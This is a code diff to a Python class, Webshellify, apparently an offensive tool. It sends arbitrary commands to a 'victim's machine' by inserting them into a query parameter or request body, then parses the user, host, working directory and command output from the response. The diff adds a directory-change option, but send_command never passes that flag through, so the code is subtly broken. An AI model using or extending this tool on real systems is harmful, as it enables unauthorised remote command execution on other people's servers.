@@ -64,13 +64,16 @@ class Webshellify:
     This command may contain additional command calls to determine additional
     information of the current user and machine name
     """
-    def __gen_command(self, command):
-        return f"""
-            echo '`{self.delimiter}-user`'; whoami; echo '`/{self.delimiter}-user`';
-            echo '`{self.delimiter}-host`'; uname -n; echo '`/{self.delimiter}-host`'
-            echo '`{self.delimiter}-wd`'; uname -n; echo '`/{self.delimiter}-wd`'
-            echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'
-            """
+    def __gen_command(self, command, chdir=False):
+        commands = ""
+        if(chdir):
+            commands += f"cd {self.workdir};"
+
+        commands += f"echo '`{self.delimiter}-user`'; whoami; echo '`/{self.delimiter}-user`';"
+        commands += f"echo '`{self.delimiter}-host`'; uname -n; echo '`/{self.delimiter}-host`'"
+        commands += f"echo '`{self.delimiter}-wd`'; pwd; echo '`/{self.delimiter}-wd`'"
+        commands += f"echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'"
+        return commands
 
     """
     Extracts the output from the command call from the page results
@@ -101,7 +104,7 @@ match: {output_re.findall(raw)}""")
         host = host_re.findall(raw)[0][0]
         workdir = wd_re.findall(raw)[0][0]
         output = output_re.findall(raw)[0][0]
-        return user, host, output
+        return user, host, workdir, output
 
     """
     Sends an individual command in isolation to the host and path initialized.
@@ -110,10 +113,15 @@ match: {output_re.findall(raw)}""")
     request. This requires the command fuzz keyword to be placed in either a
     query paramter or the request body
 
+    parameters
+    ----------
+    command: (string) - The command to execute at the victim's machine
+    chdir: (boolean, optional) - Indicates whether the directory should be changed.
+
     This function will also return the name of the host, name of the current
     user and the output of the previous command
     """
-    def send_command(self, command):
+    def send_command(self, command, chdir=False):
         cmd = self.__gen_command(command)
         # generate query
         query_str = "?"
